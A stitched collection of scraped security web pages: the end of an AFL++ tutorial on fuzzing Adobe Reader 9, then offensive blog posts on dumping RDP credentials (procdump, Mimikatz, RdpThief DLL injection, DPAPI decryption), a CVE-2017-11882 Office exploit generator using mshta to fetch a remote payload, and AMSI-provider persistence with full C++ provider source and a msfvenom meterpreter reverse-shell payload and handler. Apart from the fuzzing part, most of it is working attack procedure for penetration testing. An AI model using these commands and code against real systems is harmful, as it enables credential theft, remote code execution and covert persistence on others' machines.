installation\n\nInstall dependencies:\n```\nsudo apt-get install libxml2:i386\n```\n\nDownload and uncompress ``AdbeRdr9.5.1-1_i386linux_enu.deb``:\n\n```\nwget ftp:\/\/ftp.adobe.com\/pub\/adobe\/reader\/unix\/9.x\/9.5.1\/enu\/AdbeRdr9.5.1-1_i386linux_enu.deb\n```\n\nNow, we can install it with:\n\n```\nsudo dpkg -i AdbeRdr9.5.1-1_i386linux_enu.deb\n```\n\nThen just type:\n\n```\n.\/opt\/Adobe\/Reader9\/bin\/acroread\n```\n\nAccept the License Agreement and you should see the Adobe Reader interface:\n\n![](Images\/4.png)\n\nIf you type\n\n```\n\/opt\/Adobe\/Reader9\/bin\/acroread -help \n```\n\nyou can also see the list of available command line options\n\n### Seed corpus creation\n\nFor this exercise, I'll make use of a corpus downloaded from **SafeDocs \"Issue Tracker\" Corpus**. You can find more information about this PDF Corpus [here](https:\/\/www.pdfa.org\/a-new-stressful-pdf-corpus\/).\n\nDownload and uncompress the corpus:\n```\nwget https:\/\/corpora.tika.apache.org\/base\/packaged\/pdfs\/archive\/pdfs_202002\/libre_office.zip\nunzip libre_office.zip -d extracted\n```\n\nNow, we will copy only files **smaller than 2 kB**, to speedup the fuzzing process:\n```\nmkdir -p $HOME\/fuzzing_adobe\/afl_in\nfind .\/extracted -type f -size -2k \\\n    -exec cp {} $HOME\/fuzzing_adobe\/afl_in \\;\n```\n\n\n### First approach\n\nThe simplest way to fuzz closed-source applications is just running afl-fuzz with the **-Q argument**.\n\nYou need to take care when you run afl-fuzz, because ``\/opt\/Adobe\/Reader9\/bin\/acroread`` is a shell-script. The real binary path is the following one ``\/opt\/Adobe\/Reader9\/Reader\/intellinux\/bin\/acroread``.\n\nBut if you try to execute it you will get an error like this: ``acroread must be executed from the startup script``. That's why we need to set the ``ACRO_INSTALL_DIR`` and ``ACRO_CONFIG`` envvars. We will also set ``LD_LIBRARY_PATH`` to define the directory in which to search for dynamically linkable libraries.\n\nSaid that, you can run the fuzzer with the following command:\n```\nACRO_INSTALL_DIR=\/opt\/Adobe\/Reader9\/Reader ACRO_CONFIG=intellinux LD_LIBRARY_PATH=$LD_LIBRARY_PATH:'\/opt\/Adobe\/Reader9\/Reader\/intellinux\/lib' afl-fuzz -Q -i .\/afl_in\/ -o .\/afl_out\/ -t 2000 -- \/opt\/Adobe\/Reader9\/Reader\/intellinux\/bin\/acroread -toPostScript @@\n```\n\nAnd you should see AFL++ running:\n\n![](Images\/5.png)\n\nNow, though, the fuzzing speed is really slow: around 7 exec\/s on my machine. So, how can we improve the fuzzing speed?\n\nAnd the answer is... using Persistent fuzzing!\n\n### Persistent approach\n\nAs we see in [exercise 6](..\/Exercise%206), inserting the ``AFL_LOOP`` is the way that we have to tell AFL++ that we want to enable the persistent mode. In this case, however, we don't have access to the source code.\n\nWe can instead make use of the AFL_QEMU_PERSISTENT_ADDR to specify the start of the persistent loop. I advise you to set this address to the beginning of a function. You can find more information about AFL_QEMU persistent options [here](https:\/\/github.com\/AFLplusplus\/AFLplusplus\/blob\/stable\/qemu_mode\/README.persistent.md).\n\nFor finding an appropriate offset we can make use of a disassembler like IDA or Ghidra. In my case, I chose the following offset ``0x08546a00``:\n\n![](Images\/6.png)\n\nThere is an easier alternative to use a disassembler: to use **callgrind**.\n\nFirst of all, we will install valgrind and kcachegrind with the following command line:\n\n```\nsudo apt-get install valgrind\nsudo apt-get install kcachegrind\n```\n\nNow, we can generate a callgrind report with:\n\n```\nACRO_INSTALL_DIR=\/opt\/Adobe\/Reader9\/Reader ACRO_CONFIG=intellinux LD_LIBRARY_PATH=$LD_LIBRARY_PATH:'\/opt\/Adobe\/Reader9\/Reader\/intellinux\/lib' valgrind --tool=callgrind \/opt\/Adobe\/Reader9\/Reader\/intellinux\/bin\/acroread -toPostScript [samplePDF]\n```\n\nwhere ``samplePDF`` is the path of a PDF sample. It will generate a ``callgrind.out`` output file in your current folder. Now you can visualize this report running **kachegrind**. Just type:\n\n```\nkcachegrind \n```\n\nand you should see something like this:\n\n![](Images\/8.png)\n\nI recommend you to look at the ``count`` field in kcachegrind to identify functions that only get executed 1 time, and to try to achieve a **stability score over 90%** in afl-fuzz.\n  \nWe will set also the **AFL_QEMU_PERSISTENT_GPR=1** envvar, that will save the original value of general purpose registers and restore them in each persistent cycle.\n\nNow, we can run the fuzzer with the following command line\n\n```\nAFL_QEMU_PERSISTENT_ADDR=0x085478AC AFL_QEMU_PERSISTENT_GPR=1 ACRO_INSTALL_DIR=\/opt\/Adobe\/Reader9\/Reader ACRO_CONFIG=intellinux LD_LIBRARY_PATH=$LD_LIBRARY_PATH:'\/opt\/Adobe\/Reader9\/Reader\/intellinux\/lib' afl-fuzz -Q -i .\/afl_in\/ -o .\/afl_out\/ -t 2000 -- \/opt\/Adobe\/Reader9\/Reader\/intellinux\/bin\/acroread -toPostScript @@\n```\nAs you can see, it gives a x4 improvement in time of execution. Not bad!\n\n![](Images\/7.png)\n\nFor small projects, this approach might be enough. In a future exercise I will explain a faster approach: **write a custom harness**.\n\n### Triage\n\nIn this last step we will try to find a PoC for our OOB read vulnerability.\n\nUnfortunately, if we feed afl-qemu-trace with the crash file:\n\n```\nACRO_INSTALL_DIR=\/opt\/Adobe\/Reader9\/Reader ACRO_CONFIG=intellinux LD_LIBRARY_PATH=$LD_LIBRARY_PATH:'\/opt\/Adobe\/Reader9\/Reader\/intellinux\/lib' \/usr\/local\/bin\/afl-qemu-trace -- \/opt\/Adobe\/Reader9\/Reader\/intellinux\/bin\/acroread -toPostScript [crashFilePath] \n```\n\n(where ``crashFilePath`` is the path of the crash file), all what we can see is a message like this\n\n![](Images\/10.png)\n\nWe can get a more detailes stacktrace using **QASan**. To enable it we only need to set ``AFL_USE_QASAN=1``. You can find more information about QASAN [here](https:\/\/github.com\/andreafioraldi\/qasan). Now we type:\n\n```\nAFL_USE_QASAN=1 ACRO_INSTALL_DIR=\/opt\/Adobe\/Reader9\/Reader ACRO_CONFIG=intellinux LD_LIBRARY_PATH=$LD_LIBRARY_PATH:'\/opt\/Adobe\/Reader9\/Reader\/intellinux\/lib' \/usr\/local\/bin\/afl-qemu-trace -- \/opt\/Adobe\/Reader9\/Reader\/intellinux\/bin\/acroread -toPostScript [crashFilePath] \n```\n\nand we will get a nicer stacktrace:\n\n![](Images\/11.png)\n\n<\/details>\n"}
{"text":"#[1]Penetration Testing Lab \u00bb Feed [2]Penetration Testing Lab \u00bb\nComments Feed [3]Penetration Testing Lab \u00bb Dumping RDP Credentials\nComments Feed [4]alternate [5]alternate [6]Penetration Testing Lab\n[7]WordPress.com\n[8]Skip to content\n[9]Penetration Testing Lab\nOffensive Techniques & Methodologies\n(BUTTON) Menu\n* [10]Methodologies\n+ [11]Red Teaming\no [12]Persistence\n* [13]Resources\n+ [14]Papers\no [15]Web Application\n+ [16]Presentations\no [17]Defcon\no [18]DerbyCon\no [19]Tools\n+ [20]Videos\no [21]BSides\no [22]Defcon\no [23]DerbyCon\no [24]Hack In Paris\n* [25]Contact\n+ [26]About Us\nPosted on [27]May 24, 2021\nDumping RDP Credentials\nby [28]Administrator.In [29]Credential Access.[30]4 Comments on Dumping\nRDP Credentials\nAdministrators typically use Remote Desktop Protocol (RDP) in order to\nmanage Windows environments remotely. It is also typical RDP to be\nenabled in systems that act as a jumpstation to enable users to reach\nother networks. However even though this protocol is widely used most\nof the times it is not hardened or monitor properly.\nFrom red teaming perspective dumping credentials from the lsass process\ncan lead either to lateral movement across the network or directly to\nfull domain compromise if credentials for the domain admin account have\nbeen stored. Processes which are associated with the RDP protocol can\nalso be in the scope of red teams to harvest credentials. These\nprocesses are:\n1. svchost.exe\n2. mstsc.exe\nThe above processes can be targeted as an alternative method to\nretrieve credentials without touching lsass which is a heavily\nmonitored process typically by endpoint detection and response (EDR)\nproducts.\nsvchost\nThe service host (svchost.exe) is a system process which can host\nmultiple services to prevent consumption of resources. When a user\nauthenticates via an RDP connection the terminal service is hosted by\nthe svchost process. Based on how the Windows authentication mechanism\nworks the credentials are stored in memory of the svchost process in\nplain-text according to the discovery of [31]Jonas Lyk. However,\nlooking at the process list, there are multiple svchost processes so\nidentification of which process, hosts the terminal service connection\ncan be achieved by executing one of the following commands.\nQuerying the terminal service:\nsc queryex termservice\nsvchost Identification \u2013 Service Query\nQuerying which task has loaded the rdpcorets.dll:\ntasklist \/M:rdpcorets.dll\nsvchost Identification \u2013 RDP Core DLL\nRunning netstat:\nnetstat -nob | Select-String TermService -Context 1\nsvchost Identification \u2013 netstat\nLooking at the memory strings of the process the password is displayed\nbelow the username.\nMemory Strings\nProcess dump from Sysinternals can be used also to dump the memory by\nspecifying the PID and the directory which the .dmp file will be\nwritten.\nprocdump64.exe -ma 988 -accepteula C:\\Users\\pentestlab\nMemory Dumping \u2013 Process Dump\nThe .dmp file can be transferred to another host for offline analysis.\nPerforming a simple grep will identify the password stored in the\nmemory file below the username.\nstrings -el svchost* | grep Password123 -C3\nDiscovery of Password in Memory Dump\nThe above method doesn\u2019t consider fully reliable and it is still\nunknown in which conditions the credentials are maintained in the\nsvchost process. However, Mimikatz support the retrieval of credentials\nfrom existing RDP connections by executing the following:\nprivilege::debug\nts::logonpasswords\nMimikatz \u2013 RDP Credentials\nmstsc\nThe mstsc.exe process is created when a user opens the remote desktop\nconnection application in order to connect to other systems via the RDP\nprotocol. API hooking could be used to intercept the credentials\nprovided by the user and use them for lateral movement. [32]Rio Sherri\nhas developed a proof of concept tool called [33]RdpThief which\nattempts to hook the functions used by mstsc process\n(CredIsMarshaledCredentialW & CryptProtectMemory) in order to retrieve\nthe credentials and write them into a file on the disk. Details of the\ntool can be found in an [34]article in the MDSec website.\nFrom a system that has been compromised and the mstsc.exe is running\nthe DLL needs to be injected into the process.\nSimpleInjector.exe mstsc.exe RdpThief.dll\nRdpThief.dll \u2013 DLL Injection\nOnce the user enter the credentials for authentication to the\ndestination host these will be captured and written into a file on the\nC:\\temp folder.\nCredPrompt\nThe file creds.txt will include also the IP address. This information\ncould be utilized to move laterally across the network or even to\nescalate privileges if an elevated account is used.\n*\n*\nThe tool has been rewritten in C# by [35]Josh Magri. However comparing\nto RdpThief, [36]SharpRDPThief uses an IPC server in order to receive\nthe credentials from the mstsc.exe process. In the event that the\nmstsc.exe is terminated the server will continue to run and when the\nprocess is initiated again will attempt to perform the hooking. This\nremoves the limitation that RdpThief had that the process should\nalready exist.\nSharpRDPThief\nRDP Files\nUsers that tend to authenticate multiple times to a particular host via\nan RDP connection they might save the connections details for quick\nauthentication. These credentials are stored in an encrypted form in\nthe Credential Manager of Windows by using the Data Protection API.\nCredential Manager\nThe location of the Windows Credentials on the disk is the following:\nC:\\Users\\username\\AppData\\Local\\Microsoft\\Credentials\nWindows Credentials Location\nThe file can be viewed through the Mimikatz binary:\ndpapi::cred \/in:C:\\Users\\pentestlab\\AppData\\Local\\Microsoft\\Credentials\\ACC240EE\nE479C1B634EC496F9838074B\nDPAPI Credentials \u2013 Mimikatz\nThe \u201cpbData\u201d field contains the information in an encrypted form.\nHowever the master key for decryption is stored in the lsass and can be\nretrieved by executing the following Mimikatz module. The\n\u201cguidMasterKey\u201d is also important as multiple entries might exist when\nthe lsass is queried and it is needed to match the GUID with the Master\nKey.\nsekurlsa::dpapi\nMimikatz \u2013 DPAPI Master Key\nExecuting again the dpapi::cred module with the master key switch will\nhave as a result the decryption of the contents and the RDP credentials\nto be disclosed in plain-text.\ndpapi::cred \/in:C:\\Users\\pentestlab\\AppData\\Local\\Microsoft\\Credentials\\ACC240EE\nE479C1B634EC496F9838074B\n\/masterkey:05d8e693421698148d8a4692f27263201f1c65e0b3ac08e3be91ea75f43e71e9b398e\n2418ba0f0c62ea70a317bdba88f11da3adebd07d65d2b349f933eab85e1\nDPAPI \u2013 Decrypting Credentials\nExecuting the following command will provide the details in which\nserver these credentials belong.\nvault::list\nMimikatz \u2013 Vault List\nYouTube\nIFRAME:\n[37]https:\/\/www.youtube.com\/embed\/KzP-yx6Dq_U?version=3&rel=1&showsearc\nh=0&showinfo=1&iv_load_policy=1&fs=1&hl=en&autohide=2&wmode=transparent"}
{"text":"#[1]Evi1cg's blog\n[2]Evi1cg's blog\n(BUTTON)\n* [3]\n\u9996\u9875\n* [4]\n\u6807\u7b7e\n* [5]\n\u5206\u7c7b\n* [6]\n\u5f52\u6863\n* [7]\n\u5de5\u5177\n* [8]\n\u53cb\u94fe\n* [9]\n\u641c\u7d22\n____________________\nCVE-2017-11882\u5229\u7528\n\u53d1\u8868\u4e8e 2017-11-21 | \u5206\u7c7b\u4e8e [10]\u5947\u6280\u6deb\u5de7\n\u6700\u8fd1\u8fd9\u6bb5\u65f6\u95f4CVE-2017-11882\u633a\u706b\u7684\u3002\u5173\u4e8e\u8fd9\u4e2a\u6f0f\u6d1e\u53ef\u4ee5\u770b\u770b\u8fd9\u91cc:[11]\u9690\u85cf17\u5e74\u7684Office\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1ePOC\u6837\u672c\u5206\u6790\uff08CV\nE-2017-11882\uff09\u3002\n\u4eca\u5929\u5728twitter\u4e0a\u770b\u5230\u6709\u4eba\u5171\u4eab\u4e86\u4e00\u4e2aPOC\uff0c[12]twitter\u5730\u5740\uff0c[13]poc\u5730\u5740\uff0c\u540e\u6765\u53c8\u770b\u5230\u6709\u4eba\u5171\u4eab\u4e86\u4e00\u4e2a\u9879\u76ee[14]CVE-2\n017-11882\uff0c\u7b80\u5355\u770b\u4e86\u4e00\u4e0b\u8fd9\u4e2a\u9879\u76ee\uff0c\u901a\u8fc7\u5bf9rtf\u6587\u4ef6\u7684\u4fee\u6539\u6765\u5b9e\u73b0\u547d\u4ee4\u6267\u884c\u7684\u76ee\u7684\uff0c\u4f46\u662f\u6709\u4e2a\u7f3a\u9677\u5c31\u662f\uff0c\u8fd9\u4e2a\u9879\u76ee\u4f7f\u7528\u7684\u662f\u4f7f\u7528webdav\u7684\u65b9\u5f0f\n\u6765\u6267\u884c\u8fdc\u7a0b\u6587\u4ef6\u7684\uff0c\u4f7f\u7528\u8d77\u6765\u53ef\u80fd\u5e76\u4e0d\u5bb9\u6613\uff0c\u6240\u4ee5\u5c31\u5bf9\u6b64\u6587\u4ef6\u8fdb\u884c\u4e86\u7b80\u5355\u7684\u4fee\u6539\uff0c\u5177\u4f53\u9879\u76ee\u5730\u5740\u5982\u4e0b\uff1aGIT\uff1a[15]CVE-2017-11882 \u3002\n\u4f7f\u7528\u65b9\u5f0f\u5f88\u7b80\u5355\uff0c\u5982\u679c\u8981\u6267\u884c\u547d\u4ee4\n1\npython Command_CVE-2017-11882.py -c \"cmd.exe \/c calc.exe\" -o test.doc\ndemo\ndemo\n\u5173\u4e8e\u600e\u4e48\u8fdb\u4e00\u6b65\u5229\u7528\uff0c\u53ef\u4ee5\u53c2\u8003\u4e4b\u524d\u5199\u7684[16]\u300awindows\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u4e0d\u4f1a\u73a9\uff1f\n\u770b\u6211\uff01\u300b\uff0c\u7531\u4e8e\u6709\u957f\u5ea6\u7684\u9650\u5236\uff0c\u8fd9\u91cc\u53ef\u4ee5\u91c7\u7528mshta\u7684\u65b9\u5f0f\u6765\u6267\u884c\u3002\u6784\u9020\u7684\u547d\u4ee4\u5982\u4e0b\uff1a\n1\npython Command_CVE-2017-11882.py -c \"mshta http:\/\/site.com\/abc\" -o test.doc\n\u6700\u7ec8\u6548\u679c\u5982\u4e0b\uff1a\n1.gif\n\u89e3\u51b3\u65b9\u6848\uff1a\n1\u3001\u5fae\u8f6f\u5df2\u7ecf\u5bf9\u6b64\u6f0f\u6d1e\u505a\u51fa\u4e86\u4fee\u590d\u3002\n1\n2\n3\n(1)\u4e0b\u8f7dhttps:\/\/portal.msrc.microsoft.com\/en-US\/security-guidance\/advisory\/CVE-2017\n-11882  \u66f4\u65b0\u8865\u4e01\u8fdb\u884c\u4fee\u8865\n(2)\u5f00\u542fWindows Update\u529f\u80fd\uff0c\u5b9a\u671f\u5bf9\u7cfb\u7edf\u8fdb\u884c\u81ea\u52a8\u66f4\u65b0\n2\u3001\u7531\u4e8e\u8be5\u516c\u5f0f\u7f16\u8f91\u5668\u5df2\u7ecf17\u5e74\u672a\u505a\u66f4\u65b0\uff0c\u53ef\u80fd\u5b58\u5728\u5927\u91cf\u5b89\u5168\u6f0f\u6d1e\uff0c\u5efa\u8bae\u5728\u6ce8\u518c\u8868\u4e2d\u53d6\u6d88\u8be5\u6a21\u5757\u7684\u6ce8\u518c\u3002\n\u6309\u4e0bWin+R\u7ec4\u5408\u952e\uff0c\u6253\u5f00cmd.exe\n\u5bf9\u5e94office\u7248\u672c\u4fee\u6539\u4ee5\u4e0b\u6ce8\u518c\u8868\u8def\u5f84\u4ee5\u540e\uff0c\u8f93\u5165\uff1a\n1\n2\n3\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Office\\XX.X\\Common\\COM Compatibility\\{0002CE02-\n0000- 0000-C000-000000000046}\" \/v \"Compatibility Flags\" \/t REG_DWORD \/d 0x400\nreg add \"HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Office\\XX.X\\Common\\COM Compatibilit\ny\\{0002CE02-0000-0000-C000-000000000046}\" \/v \"Compatibility Flags\" \/t REG_DWORD\n\/d 0x400\n------\u672c\u6587\u7ed3\u675f\uff0c\u611f\u8c22\u9605\u8bfb------\n* \u672c\u6587\u4f5c\u8005\uff1a Evi1cg\n* \u672c\u6587\u94fe\u63a5\uff1a [17]https:\/\/evi1cg.github.io\/archives\/CVE_2017_11882_exp.html\n* \u7248\u6743\u58f0\u660e\uff1a \u672c\u535a\u5ba2\u6240\u6709\u6587\u7ae0\u9664\u7279\u522b\u58f0\u660e\u5916\uff0c\u5747\u91c7\u7528 [18]BY-NC-SA \u8bb8\u53ef\u534f\u8bae\u3002\u8f6c\u8f7d\u8bf7\u6ce8\u660e\u51fa\u5904\uff01\n[19]# office\n[20]\u4f60\u80fd\u627e\u5230\u6211\u4e48\uff1f-- \u9690\u85cf\u7528\u6237\u5efa\u7acb\uff08Powershell\uff09\n[21]\u901a\u8fc7Microsoft Office \u7a83\u53d6 NTLM Hashes\n[22]Evi1cg\nEvi1cg\n\u6b64\u535a\u5ba2\u4e3b\u8981\u7528\u6765\u8bb0\u5f55\u81ea\u5df1\u6280\u672f\u751f\u6daf\u4e2d\u6240\u5b66\u7684\u4e00\u4e9b\u77e5\u8bc6,\u7528\u6765\u5206\u4eab\u548c\u5907\u5fd8\u3002\n[23]104 \u65e5\u5fd7\n[24]7 \u5206\u7c7b\n[25]54 \u6807\u7b7e\n[26]RSS\n[27]GitHub [28]Twitter [29]\u5fae\u535a [30]E-Mail\n[31]whois api\n\u00a9 2015 \u2013 2022 Evi1cg"}
{"text":"#[1]Penetration Testing Lab \u00bb Feed [2]Penetration Testing Lab \u00bb\nComments Feed [3]Penetration Testing Lab \u00bb Persistence \u2013 AMSI Comments\nFeed [4]alternate [5]alternate [6]Penetration Testing Lab\n[7]WordPress.com\n[8]Skip to content\n[9]Penetration Testing Lab\nOffensive Techniques & Methodologies\n(BUTTON) Menu\n* [10]Methodologies\n+ [11]Red Teaming\no [12]Persistence\n* [13]Resources\n+ [14]Papers\no [15]Web Application\n+ [16]Presentations\no [17]Defcon\no [18]DerbyCon\no [19]Tools\n+ [20]Videos\no [21]BSides\no [22]Defcon\no [23]DerbyCon\no [24]Hack In Paris\n* [25]Contact\n+ [26]About Us\nPosted on [27]May 17, 2021\nPersistence \u2013 AMSI\nby [28]Administrator.In [29]Persistence.[30]Leave a Comment on\nPersistence \u2013 AMSI\nAMSI (Antimalware Scan Interface) is a vendor agnostic interface which\ncan communicate with the endpoint in order to prevent execution of\nmalware. The scan performed by the endpoint is signature based and\ntherefore could be bypassed trivially via multiple methods prior to any\nscript execution as it has been described by [31]Pentest Laboratories.\nHowever it is feasible outside of execution of arbitrary scripts to\nabuse AMSI by registering a provider for persistence in the event that\nan elevated account has been compromised.\nThe Metasploit Framework \u201cmsfvenom\u201d can be used to generate a payload\nthat will be executed when the trigger word is typed in PowerShell\nconsole.\nsudo msfvenom -p windows\/x64\/meterpreter\/reverse_tcp LHOST=<IP> LPORT=<Port> -f\nexe > \/home\/kali\/pentestlab.exe\nPayload Generation\nMetasploit \u201chandler\u201d module can be configured to capture the payload\nthat will be executed.\nuse exploit\/multi\/handler\nset payload windows\/x64\/meterpreter\/reverse_tcp\nset LHOST <IP>\nset LPORT <Port>\nrun\nMetasploit Handler\nMicrosoft has provided the code for implementing a sample AMSI\nprovider. Originally this technique was discovered by [32]b4rtik has\npublished and the modified Microsoft code has been released in his\n[33]blog. However a [34]GitHub repository was created as some of the\nrequired headers were missing and some functions were not defined. The\nfollowing code represents the fake AMSI provider which upon execution\nof the trigger will open calc.exe.\n#include \"stdafx.h\"\n#include <process.h>\n#include <subauth.h>\n#include <strsafe.h>\n#include <amsi.h>\n#include <windows.h>\n#include <wrl\/module.h>\nusing namespace Microsoft::WRL;\nHMODULE g_currentModule;\ntypedef void (NTAPI* _RtlInitUnicodeString)(\nPUNICODE_STRING DestinationString,\nPCWSTR SourceString\n);\ntypedef NTSYSAPI BOOLEAN(NTAPI* _RtlEqualUnicodeString)(\nPUNICODE_STRING String1,\nPUNICODE_STRING String2,\nBOOLEAN CaseInsetive\n);\nDWORD WINAPI MyThreadFunction(LPVOID lpParam);\nvoid ErrorHandler(LPTSTR lpszFunction);\nBOOL APIENTRY DllMain(HMODULE module, DWORD reason, LPVOID reserved)\n{\nswitch (reason)\n{\ncase DLL_PROCESS_ATTACH:\ng_currentModule = module;\nDisableThreadLibraryCalls(module);\nModule<InProc>::GetModule().Create();\nbreak;\ncase DLL_PROCESS_DETACH:\nModule<InProc>::GetModule().Terminate();\nbreak;\n}\nreturn TRUE;\n}\n#pragma region COM server boilerplate\nHRESULT WINAPI DllCanUnloadNow()\n{\nreturn Module<InProc>::GetModule().Terminate() ? S_OK : S_FALSE;\n}\nSTDAPI DllGetClassObject(_In_ REFCLSID rclsid, _In_ REFIID riid, _Outptr_ LPVOID\nFAR* ppv)\n{\nreturn Module<InProc>::GetModule().GetClassObject(rclsid, riid, ppv);\n}\n#pragma endregion\nclass\nDECLSPEC_UUID(\"2E5D8A62-77F9-4F7B-A90C-2744820139B2\")\nPentestlabAmsiProvider : public RuntimeClass<RuntimeClassFlags<ClassicCo\nm>, IAntimalwareProvider, FtmBase>\n{\npublic:\nIFACEMETHOD(Scan)(_In_ IAmsiStream * stream, _Out_ AMSI_RESULT * result)\noverride;\nIFACEMETHOD_(void, CloseSession)(_In_ ULONGLONG session) override;\nIFACEMETHOD(DisplayName)(_Outptr_ LPWSTR * displayName) override;\nprivate:\nLONG m_requestNumber = 0;\n};\nHRESULT PentestlabAmsiProvider::Scan(_In_ IAmsiStream* stream, _Out_ AMSI_RESULT\n* result)\n{\n_RtlInitUnicodeString RtlInitUnicodeString = (_RtlInitUnicodeString)GetP\nrocAddress(GetModuleHandle(L\"ntdll.dll\"), \"RtlInitUnicodeString\");\n_RtlEqualUnicodeString RtlEqualUnicodeString = (_RtlEqualUnicodeString)G\netProcAddress(GetModuleHandle(L\"ntdll.dll\"), \"RtlEqualUnicodeString\");\nUNICODE_STRING myTriggerString1;\nRtlInitUnicodeString(&myTriggerString1, L\"pentestlab\");\nUNICODE_STRING myTriggerString2;\nRtlInitUnicodeString(&myTriggerString2, L\"\\\"pentestlab\\\"\");\nUNICODE_STRING myTriggerString3;\nRtlInitUnicodeString(&myTriggerString3, L\"'pentestlab'\");\nULONG actualSize;\nULONGLONG contentSize;\nif (!SUCCEEDED(stream->GetAttribute(AMSI_ATTRIBUTE_CONTENT_SIZE, sizeof(\nULONGLONG), reinterpret_cast<PBYTE>(&contentSize), &actualSize)) &&\nactualSize == sizeof(ULONGLONG))\n{\n*result = AMSI_RESULT_NOT_DETECTED;\nreturn S_OK;\n}\nPBYTE contentAddress;\nif (!SUCCEEDED(stream->GetAttribute(AMSI_ATTRIBUTE_CONTENT_ADDRESS, size\nof(PBYTE), reinterpret_cast<PBYTE>(&contentAddress), &actualSize)) &&\nactualSize == sizeof(PBYTE))\n{\n*result = AMSI_RESULT_NOT_DETECTED;\nreturn S_OK;\n}\nif (contentAddress)\n{\nif (contentSize < 50)\n{\nUNICODE_STRING myuni;\nmyuni.Buffer = (PWSTR)contentAddress;\nmyuni.Length = (USHORT)contentSize;\nmyuni.MaximumLength = (USHORT)contentSize;\nif (RtlEqualUnicodeString(&myTriggerString1, &myuni, TRU\nE) || RtlEqualUnicodeString(&myTriggerString2, &myuni, TRUE) || RtlEqualUnicodeS\ntring(&myTriggerString3, &myuni, TRUE))\n{\nDWORD thId;\nCreateThread(NULL, 0, MyThreadFunction, NULL, 0,\n&thId);\n}\n}\n}\n*result = AMSI_RESULT_NOT_DETECTED;\nreturn S_OK;\n}\nvoid PentestlabAmsiProvider::CloseSession(_In_ ULONGLONG session)\n{\n}\nHRESULT PentestlabAmsiProvider::DisplayName(_Outptr_ LPWSTR* displayName)\n{\n*displayName = const_cast<LPWSTR>(L\"Sample AMSI Provider\");\nreturn S_OK;\n}\nCoCreatableClass(PentestlabAmsiProvider);\nDWORD WINAPI MyThreadFunction(LPVOID lpParam)\n{\nsystem(\"c:\\\\Windows\\\\System32\\\\calc.exe\");\nreturn 0;\n}\n#pragma region Install \/ uninstall\nHRESULT SetKeyStringValue(_In_ HKEY key, _In_opt_ PCWSTR subkey, _In_opt_ PCWSTR\nvalueName, _In_ PCWSTR stringValue)\n{\nLONG status = RegSetKeyValue(key, subkey, valueName, REG_SZ, stringValue\n, (wcslen(stringValue) + 1) * sizeof(wchar_t));\nreturn HRESULT_FROM_WIN32(status);\n}\nSTDAPI DllRegisterServer()\n{\nwchar_t modulePath[MAX_PATH];\nif (GetModuleFileName(g_currentModule, modulePath, ARRAYSIZE(modulePath)\n) >= ARRAYSIZE(modulePath))\n{\nreturn E_UNEXPECTED;\n}\nwchar_t clsidString[40];\nif (StringFromGUID2(__uuidof(PentestlabAmsiProvider), clsidString, ARRAY\nSIZE(clsidString)) == 0)\n{\nreturn E_UNEXPECTED;\n}\nwchar_t keyPath[200];\nHRESULT hr = StringCchPrintf(keyPath, ARRAYSIZE(keyPath), L\"Software\\\\Cl\nasses\\\\CLSID\\\\%ls\", clsidString);\nif (FAILED(hr)) return hr;\nhr = SetKeyStringValue(HKEY_LOCAL_MACHINE, keyPath, nullptr, L\"Pentestla\nbAmsiProvider\");\nif (FAILED(hr)) return hr;\nhr = StringCchPrintf(keyPath, ARRAYSIZE(keyPath), L\"Software\\\\Classes\\\\C\nLSID\\\\%ls\\\\InProcServer32\", clsidString);\nif (FAILED(hr)) return hr;\nhr = SetKeyStringValue(HKEY_LOCAL_MACHINE, keyPath, nullptr, modulePath)\n;\nif (FAILED(hr)) return hr;\nhr = SetKeyStringValue(HKEY_LOCAL_MACHINE, keyPath, L\"ThreadingModel\", L\n\"Both\");\nif (FAILED(hr)) return hr;\n\/\/ Register this CLSID as an anti-malware provider.\nhr = StringCchPrintf(keyPath, ARRAYSIZE(keyPath), L\"Software\\\\Microsoft\\\n\\AMSI\\\\Providers\\\\%ls\", clsidString);\nif (FAILED(hr)) return hr;\nhr = SetKeyStringValue(HKEY_LOCAL_MACHINE, keyPath, nullptr, L\"Pentestla\nbAmsiProvider\");\nif (FAILED(hr)) return hr;\nreturn S_OK;\n}\nSTDAPI DllUnregisterServer()\n{\nwchar_t clsidString[40];\nif (StringFromGUID2(__uuidof(PentestlabAmsiProvider), clsidString, ARRAY\nSIZE(clsidString)) == 0)\n{\nreturn E_UNEXPECTED;\n}\n\/\/ Unregister this CLSID as an anti-malware provider.\nwchar_t keyPath[200];\nHRESULT hr = StringCchPrintf(keyPath, ARRAYSIZE(keyPath), L\"Software\\\\Mi\ncrosoft\\\\AMSI\\\\Providers\\\\%ls\", clsidString);\nif (FAILED(hr)) return hr;\nLONG status = RegDeleteTree(HKEY_LOCAL_MACHINE, keyPath);\nif (status != NO_ERROR && status != ERROR_PATH_NOT_FOUND) return HRESULT\n_FROM_WIN32(status);\n\/\/ Unregister this CLSID as a COM server.\nhr = StringCchPrintf(keyPath, ARRAYSIZE(keyPath), L\"Software\\\\Classes\\\\C\nLSID\\\\%ls\", clsidString);\nif (FAILED(hr)) return hr;\nstatus = RegDeleteTree(HKEY_LOCAL_MACHINE, keyPath);\nif (status != NO_ERROR && status != ERROR_PATH_NOT_FOUND) return HRESULT\n_FROM_WIN32(status);\nreturn S_OK;\n}\n#pragma endregion\nThe AMSI Provider can be registered with the system with the regsvr32\nutility.\nregsvr32 AmsiProvider.dll\nRegister Malicious AMSI Provider\nThe following registry key will contain the arbitrary AMSI provider.\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\AMSI\\Providers\nAMSI Provider \u2013 Registry\nWhen the keyword is passed on a PowerShell console the target payload\nwill executed and a connection will received back to the Command and\nControl server.\n\"pentestlab\"\nPersistence \u2013 AMSI Provider TriggerPersistence \u2013 AMSI Provider\nMeterpreter\nYouTube\nIFRAME:\n[35]https:\/\/www.youtube.com\/embed\/CbbkwZFiGm4?version=3&rel=1&showsearc\nh=0&showinfo=1&iv_load_policy=1&fs=1&hl=en&autohide=2&wmode=transparent"}
